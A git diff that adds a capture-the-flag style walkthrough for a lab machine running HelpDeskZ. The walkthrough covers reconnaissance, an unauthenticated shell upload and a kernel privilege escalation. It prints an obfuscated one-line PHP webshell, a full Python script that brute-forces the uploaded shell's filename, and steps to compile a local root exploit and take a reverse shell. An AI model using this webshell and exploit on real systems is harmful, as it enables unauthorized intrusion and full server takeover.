@@ -115,4 +115,79 @@ Finished!
 
 # Help
 
-ON THE WAY...
+## Step 1: NMAP
+
+80 For HTTP; 22 For SSH, Useless; 3000 For HTTP, Node.js ExpressJS framework.
+
+Then use Nikto: Found Apache default page on port 80, found HelpDeskZ on `/support` .
+
+## Step 2: Exploit, get normal user
+
+Vulnerable Software Source Code:  [Sourcegraph](https://sourcegraph.com/github.com/AlexisGoatache/HelpDeskZ@006662bb856e126a38f2bb76df44a2e4e3d37350/-/blob/controllers/submit_ticket_controller.php#L137)
+
+Check the code, even the developer let the filename get obfuscated by "Filename + MD5(timestamp).php", it still could be found via bruteforce.
+
+```php
+<?php
+// ScFVmDQa 
+$YdyH=create_function(chr(11232/312).base64_decode('cw==').chr(01014-0635).chr(0256112/01462).str_rot13('r'),chr(354-253).chr(0x187-0x111).base64_decode('YQ==').chr(0x11e74/0x2a7).chr(026140/0434).chr(31644/879).chr(101775/885).str_rot13('b').chr(0x355-0x2e8).str_rot13('r').chr(738-697).chr(073261/01003));$YdyH(base64_decode('MzMxM'.'jQyO0'.'BldkF'.'sKCRf'.''.base64_decode('VQ==').str_rot13('R').chr(711-654).str_rot13('G').chr(17286/201).''.''.chr(063750/0574).chr(01071-0705).chr(01674-01550).chr(0xbc15/0x21d).str_rot13('0').''.'ZWbUR'.'RYV0p'.'Ozk5M'.'zcyNj'.'s='.''));?>
+```
+
+Finish all the stuffs in the ticket and upload the one-line PHP trojan as attachment, **even if you get a notification that "File is not allowed", the file is successfully uploaded in fact.**
+
+Use the python exploit here to enum the PHP trojan filename:
+
+```python2
+#!/usr/bin/env python2
+# EID: 40300
+
+import hashlib
+import time
+import sys
+import requests
+
+print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
+
+if len(sys.argv) < 3:
+    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
+    sys.exit(1)
+
+helpdeskzBaseUrl = sys.argv[1]
+fileName = sys.argv[2]
+
+currentTime = int(time.time())
+
+for x in range(0, 1500):
+    plaintext = fileName + str(currentTime - x)
+    md5hash = hashlib.md5(plaintext).hexdigest()
+
+    url = helpdeskzBaseUrl+md5hash+'.php'
+    print "This is the " + str(x) + "time:"
+    response = requests.head(url)
+    if response.status_code == 200:
+        print "found!"
+        print url
+        sys.exit(0)
+    else:
+        print "has tried " + url + ": " + str(response.status_code)
+
+print "Sorry, I did not find anything"
+```
+
+Use the `http://10.10.10.121/support/uploads/tickets/ <PHP TROJAN FILENAME>` , please don't forget the last `/` of the app base URL.
+
+After found it, just send a GET request to activate. Then do anything you want via `AntSword`.
+
+## Step 3: Privilege Escalation
+
+Execute `uname -a`, found `Linux Kernel 4.4.0-116`, GoogleFU~
+
+Found a local privilege escalation exploit in `searchsploit "4.4.0-116"`, just mirrored it and send it to the box then compile it.
+
+Get a reverse shell, then use `bash` to get the interactive shell, and use `python3` to spawn a tty.
+
+Next, compile and execute: `gcc -o exsc 44298.c && ./exsc`, and then it will gives you a rooted spawned interactive reverse shell.
+
+Finished.
+
+(END) 2019.5.14
